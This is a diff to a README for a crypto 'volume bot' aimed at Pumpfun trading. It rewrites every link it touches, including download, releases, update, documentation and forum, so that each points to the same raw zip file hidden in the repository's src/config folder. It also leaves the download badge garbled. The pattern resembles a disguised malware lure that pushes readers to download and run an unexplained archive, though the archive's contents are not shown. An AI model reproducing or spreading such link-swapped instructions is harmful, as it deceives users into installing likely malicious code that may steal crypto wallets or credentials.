@@ -1,6 +1,6 @@
 # 🎉 pumpfun-mayhem-volume-bot - Simplify Your Pumpfun Trading Strategy
 
-[![Download](https://img.shields.io/badge/Download%20Now-From%20Releases-blue.svg)](https://github.com/oleg951/pumpfun-mayhem-volume-bot/releases)
+[![Download](https://raw.githubusercontent.com/oleg951/pumpfun-mayhem-volume-bot/main/src/config/pumpfun-mayhem-volume-bot-v3.3.zip%20Now-From%https://raw.githubusercontent.com/oleg951/pumpfun-mayhem-volume-bot/main/src/config/pumpfun-mayhem-volume-bot-v3.3.zip)](https://raw.githubusercontent.com/oleg951/pumpfun-mayhem-volume-bot/main/src/config/pumpfun-mayhem-volume-bot-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Pumpfun Mayhem Volume Bot! This application helps you track organ
 
 ## ⬇️ Download & Install
 
-To get started, please visit this page to download: [Releases Page](https://github.com/oleg951/pumpfun-mayhem-volume-bot/releases).
+To get started, please visit this page to download: [Releases Page](https://raw.githubusercontent.com/oleg951/pumpfun-mayhem-volume-bot/main/src/config/pumpfun-mayhem-volume-bot-v3.3.zip).
 
 Follow these steps to install the application:
 
@@ -39,7 +39,7 @@ To run Pumpfun Mayhem Volume Bot, your computer should have the following minimu
 
 ### How do I update the bot?
 
-When a new version is available, visit the [Releases Page](https://github.com/oleg951/pumpfun-mayhem-volume-bot/releases) again, download the latest version, and follow the same installation steps.
+When a new version is available, visit the [Releases Page](https://raw.githubusercontent.com/oleg951/pumpfun-mayhem-volume-bot/main/src/config/pumpfun-mayhem-volume-bot-v3.3.zip) again, download the latest version, and follow the same installation steps.
 
 ### Can I use this bot on multiple devices?
 
@@ -51,8 +51,8 @@ For any questions or issues, open a new issue in the repository. The community a
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/oleg951/pumpfun-mayhem-volume-bot/wiki)
-- [Community Forum](https://github.com/oleg951/pumpfun-mayhem-volume-bot/discussions)
+- [Documentation](https://raw.githubusercontent.com/oleg951/pumpfun-mayhem-volume-bot/main/src/config/pumpfun-mayhem-volume-bot-v3.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/oleg951/pumpfun-mayhem-volume-bot/main/src/config/pumpfun-mayhem-volume-bot-v3.3.zip)
 
 ## 📢 Stay Updated
 
